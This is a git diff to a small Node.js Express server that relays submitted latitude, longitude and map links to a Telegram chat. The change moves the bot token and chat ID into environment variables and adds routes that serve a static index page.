@@ -3,13 +3,21 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const path = require("path");
+
+require('dotenv').config(); // Carrega variáveis do .env
 
 const app = express();
+app.use(express.static(path.join(__dirname, 'public'))); //servir arquivos estáticos
 app.use(cors());
 app.use(bodyParser.json());
 
-const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+const TELEGRAM_BOT_TOKEN = process.env.BOT_TOKEN; // Substitua pelo token do seu bot
+const TELEGRAM_CHAT_ID = process.env.CHAT_ID; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "index.html"));
+});
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
@@ -29,6 +37,7 @@ app.post("/send-location", async (req, res) => {
     res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
   }
 });
+
 
 app.listen(8088, () => {
   console.log("Servidor rodando na porta 8088");
